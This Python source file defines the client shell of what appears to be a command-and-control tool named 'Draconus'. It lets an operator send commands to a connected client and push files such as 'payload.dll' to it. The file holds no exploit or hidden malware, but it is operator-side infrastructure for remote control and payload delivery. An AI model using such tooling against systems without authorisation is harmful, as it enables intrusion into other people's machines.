import click
import os
from click_shell import shell
from termcolor import cprint

class ClientShell:
    def __init__(self, draco_shell: object, commander: object, client_data: dict):
        self.__client_data = client_data
        self.client_id = client_data.get("client_id")
        self.client_id = str(self.client_id)
        self.client_name = client_data.get("client_name")
        self.client_owner = client_data.get("server_name")
        self.C2 = commander
        self.dracoShell = draco_shell
        self.pSort = self.dracoShell.print_sort
        self.pTitle = self.dracoShell.print_title
        self.cmd_SYS = self.dracoShell.cmd_SYS
        self.cmd_SEND = self.C2.cmd_SendRaw

        self.INPUT_DIR = self.C2.CONF.DIR_INPUT
    
    def exit_client_shell(self, *args, **kwargs) -> None:
        cprint("[Draconus] Exit Client Shell", "yellow")
    
    def shellBuild(self) -> object:

        @shell(prompt=f"[{self.client_owner}][{self.client_name}] >>", intro="------ Client Shell ------- ", on_finished=self.exit_client_shell)
        def cliShell() -> None:
            pass
        
        
        @cliShell.command()
        def help() -> None:
            self.pTitle("  Client Command  ")
            self.pSort("exit", "Exit client shell. Back to Draconus shell.")
            self.pSort("clr, clear", "Clear Screen")
            self.pSort("msg [text]", 'Send message / command to client. Put message quotation marks “”')
            self.pSort("", 'Ex: msg "help"')
            self.pSort("", 'Ex: msg "Hello World"')
            self.pSort("fsend [file_name]", "Send file to Client. The file must be located in the INPUT directory.")
            self.pSort("", 'Ex: fsend payload.dll')
        
        @cliShell.command()
        def clr() -> None:
            os.system("clear")
        
        @cliShell.command()
        def clear() -> None:
            os.system("clear")

        @cliShell.command()
        @click.argument("message")
        def msg(message):
            cmd = self.cmd_SYS.copy()
            cmd["cmd"] = "client_msg"
            cmd["client_id"] = self.client_id
            cmd["msg"] = message
            self.cmd_SEND(cmd)
        
        @cliShell.command()
        @click.argument("file_name")
        def fsend(file_name):
            fpath = os.path.join(self.INPUT_DIR, file_name)
            if not os.path.exists(fpath):
                cprint(f"[{self.client_owner}][{self.client_name}] ERROR: {file_name} does not exist in the INPUT directory.", "red")
                return
            cmd = self.cmd_SYS.copy()
            cmd["cmd"] = "client_send"
            cmd["client_id"] = self.client_id
            cmd["file_name"] = file_name
            self.cmd_SEND(cmd)

        return cliShell
    

    def Start(self) -> None:
        client_shell = self.shellBuild()
        client_shell()